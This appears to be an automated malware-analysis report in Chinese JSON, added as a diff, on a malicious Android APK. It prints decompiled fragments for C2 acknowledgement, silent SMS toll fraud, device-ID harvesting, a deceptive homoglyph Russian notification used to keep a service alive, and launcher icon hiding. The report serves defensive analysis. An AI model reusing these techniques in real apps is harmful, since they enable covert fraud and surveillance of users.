@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "51b97227a6c0866af7a01a7dde873626506f724dad2d555cfba0d5c79b8c9d00.apk",
+    "sha256": "51b97227a6c0866af7a01a7dde873626506f724dad2d555cfba0d5c79b8c9d00",
+    "包名": "com.scream.conception",
+    "应用名": "Фoто",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 336.0
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\scream\\conception\\FaceCrutch;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void a(Context context, Intent intent) {\n    new a(context, 3).a(\"id\", intent.getStringExtra(\"id\"))\n        .a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0)))\n        .a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true)))\n        .a(\"status\", Integer.valueOf(getResultCode()))\n        .a();\n}\n\nprivate Object[] a(Bundle bundle) {\n    return (Object[]) bundle.get(\"pdus\");\n}",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class FaceCrutch extends BroadcastReceiver {\n>>>     private void a(Context context, Intent intent) {\n>>>         new a(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n>>>     }\n>>> \n>>>     private Object[] a(Bundle bundle) {\n>>>         return (Object[]) bundle.get(\"pdus\");\n>>>     }\n>>> \n>>>     private void b(Context context, Intent intent) {\n>>>         Method method;\n>>>         String displayOriginatingAddress;\n          Method method2 = null;\n          Bundle extras = intent.getExtras();\n          if (extras == null) {",
+          "behavior_description": "该类是一个混淆的 BroadcastReceiver（短信指令处理组件）。方法 a(Context, Intent) 在短信相关广播（发送/送达回执）触发时，通过流式构建器 new a(context, 3) 将指令ID（id）、指令编号（command）、是否回传标志（post）以及广播执行结果码（status）打包成键值对，最终调用 .a() 执行网络上报，即把指令执行结果作为回执发送到 C2 服务器，构成远程控制的命令确认闭环。同类的 a(Bundle) 方法从广播中提取 pdus（短信PDU），配合 b() 方法解析收到的短信内容，表明该组件负责接收短信指令并上报执行状态，是典型的短信僵尸网络/C2 远控通信模块。数据流向：短信广播 Intent 中的指令参数与执行结果码→ HTTP 参数组包→ 网络上报至 C2 服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\scream\\conception\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try {\n    SlowAdvocate.a(true);\n    SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n} catch (Exception e) {\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             SlowAdvocate.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static void a(Context context, boolean z) {",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信，目标号码(str)和短信内容(str2)均由外部调用方传入（通常来自C2服务器下发指令或硬编码的增值服务号码），整个过程无需用户知情或确认，即可完成短信发送。异常被空catch块静默吞掉以规避崩溃和检测。结合厂商报告（Zscaler确认该样本伪装成Messages应用、滥用AccessibilityService实施恶意行为）及同文件中存在的setRepeating定时保活机制，该静默发短信行为可导致用户在不知情状态下被订阅增值业务产生扣费，属于典型的短信欺诈(toll fraud)行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\scream\\conception\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 Settings.Secure 数据库中读取设备的 ANDROID_ID（设备级唯一标识符），实现设备指纹采集。数据流向：系统 Settings.Secure 设置数据库（source）→ 读取 android_id 设备唯一标识 → 作为返回值提供给上层调用模块（sink），用于唯一标识和跟踪受害者设备。该代码位于混淆类 com.scream.conception.d 中，属于已确认恶意样本（伪装成'Сообщениe/信息'应用、滥用 AccessibilityService 的间谍软件）的指纹采集模块，采集的设备标识通常用于向 C2 上报时标识受害者；同类中还包含按时间间隔（超过9786ms）以 FLAG_ACTIVITY_NEW_TASK 隐蔽拉起 Thin Activity 的辅助逻辑，与样本自我隐藏/保活行为相呼应。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\scream\\conception\\ExportBuffet;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    createNotificationChannel(new NotificationChannel(\"com.scream.conception.MANAGE\", \"Spirit\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"com.scream.conception.MANAGE\");\n}\nbuilder.setContentTitle(\"Ocновной прoцеcc\").setContentText(\"Система нe кoрректно рaботает, вaм необходимо включить дoступ к статистике для 'Ocновной прoцеcc'\");\nstartForeground(1740, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"com.scream.conception.MANAGE\", \"Spirit\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.scream.conception.MANAGE\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n          builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Ocновной прoцеcc\").setContentText(\"Система нe кoрректно рaботает, вaм необходимо включить дoступ к статистике для 'Ocновной прoцеcc'\").setWhen(System.currentTimeMillis());\n          startForeground(1740, builder.build());\n      }",
+          "behavior_description": "该代码位于恶意样本的 Service 组件中，通过 createNotificationChannel 创建通知渠道后，构建一条伪装成系统错误的俄语通知（标题'基本进程'，内容声称'系统运行异常，需为基本进程开启统计访问权限'，且文本混用西里尔字母与拉丁同形字符以规避字符串检测），随后调用 startForeground(1740, notification) 将恶意服务提升为前台服务。数据流向：硬编码的欺骗性通知文本→Notification.Builder 构建→startForeground() 前台保活。此举一方面使恶意服务获得高优先级常驻内存、规避系统回收实现持久化；另一方面通过伪造系统错误提示对用户进行社会工程学诱导，促使其开启无障碍（Accessibility）权限，与厂商报告中该样本滥用 AccessibilityService 进行隐蔽监控窃取的行为相互印证，属于间谍类恶意软件的持久化与诱导组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\scream\\conception\\Rotten;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Rotten.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Rotten extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Rotten.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该 Activity（Rotten）在 onCreate() 中立即调用 a()，随后 finish() 关闭自身。a() 通过 PackageManager.setComponentEnabledSetting() 将自身 Activity 组件的启用状态设置为 2（COMPONENT_ENABLED_STATE_DISABLED），即禁用该启动器入口组件，使应用图标从桌面/启动器中消失。数据流向：getApplicationContext() 获取自身上下文并构造 ComponentName（source）→ setComponentEnabledSetting 以 DISABLED 状态禁用组件（sink），实现首次运行后图标自隐藏。结合厂商报告，该样本伪装成'Сообщениe（Messages）'应用，利用 AccessibilityService 进行间谍活动，图标隐藏是其隐蔽自身、防止用户察觉和卸载的关键步骤，属于典型的恶意隐匿行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
